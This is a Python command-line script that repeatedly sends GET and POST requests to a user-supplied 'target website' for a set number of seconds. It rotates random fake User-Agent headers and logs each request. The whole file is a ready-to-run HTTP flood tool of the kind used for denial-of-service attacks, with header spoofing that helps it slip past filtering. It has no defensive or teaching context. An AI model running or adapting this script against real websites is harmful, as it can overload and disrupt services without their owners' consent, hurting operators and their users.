import argparse
import requests
import threading
import time
from fake_useragent import UserAgent

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'

def send_http_requests(url, duration):
    start_time = time.time()
    end_time = start_time + duration
    requests_sent = 0

    while time.time() < end_time:
        try:
            user_agent = UserAgent().random
            headers = {'User-Agent': user_agent}
            response = requests.get(url, headers=headers)
            # Uncomment the line below if you want to print the response content
            # print(response.text)
            requests_sent += 1
            print("{green}[+] Sent GET request to {url} (User-Agent: {user_agent}){endc}".format(green=GREEN, url=url, user_agent=user_agent, endc=ENDC))
        except Exception as e:
            print("{red}[-] Error sending GET request: {error}{endc}".format(red=RED, error=str(e), endc=ENDC))

        try:
            user_agent = UserAgent().random
            headers = {'User-Agent': user_agent}
            response = requests.post(url, headers=headers)
            # Uncomment the line below if you want to print the response content
            # print(response.text)
            requests_sent += 1
            print("{green}[+] Sent POST request to {url} (User-Agent: {user_agent}){endc}".format(green=GREEN, url=url, user_agent=user_agent, endc=ENDC))
        except Exception as e:
            print("{red}[-] Error sending POST request: {error}{endc}".format(red=RED, error=str(e), endc=ENDC))

    print("Sent {count} HTTP requests to {url} in {duration} seconds.".format(count=requests_sent, url=url, duration=duration))

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Send HTTP requests to a specified URL for a specified duration.")
    parser.add_argument("url", type=str, help="The URL of the target website")
    parser.add_argument("duration", type=float, help="The duration in seconds for sending HTTP requests")
    args = parser.parse_args()

    # Call the function to send HTTP requests
    send_http_requests(args.url, args.duration)
